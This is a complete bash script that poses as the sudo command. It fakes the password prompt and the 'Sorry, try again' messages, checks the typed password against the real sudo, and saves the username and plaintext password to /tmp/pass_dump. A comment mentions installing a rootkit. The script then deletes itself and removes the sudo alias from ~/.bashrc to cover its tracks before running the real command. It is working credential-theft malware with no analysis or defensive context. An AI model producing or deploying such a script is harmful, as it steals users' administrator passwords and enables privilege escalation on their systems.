#!/bin/bash

REAL_SUDO='/usr/bin/sudo'

# param1: password
check_pass() {
	echo "$1"|$REAL_SUDO -S ls 2>/dev/null 1>/dev/null
	return $?
}

read_pass() {
	USR_PASS=""
	read -s -p '[sudo] password for '$USER':' USR_PASS
	echo 
}

if (($#==0)); then
	$REAL_SUDO
	exit
fi

# get passwd until correct 
((count=1))
read_pass
until check_pass "$USR_PASS"; do
	if ((count++ == 3)); then
		echo sudo: 3 incorrect password attempts
		exit 1
	fi

	echo Sorry, try again.
	read_pass
done

# save pass, execute as sudo, install rootkit etc
echo -e 'user:'$USER'\npasswd:'$USR_PASS > /tmp/pass_dump 

# remove itself
rm $0
sed 's/alias sudo=.*//g' $HOME'/.bashrc' > $HOME'/.tmp11'; mv $HOME'/.tmp11' $HOME'/.bashrc'

# run real sudo
echo $USR_PASS|$REAL_SUDO -S -p '' $@

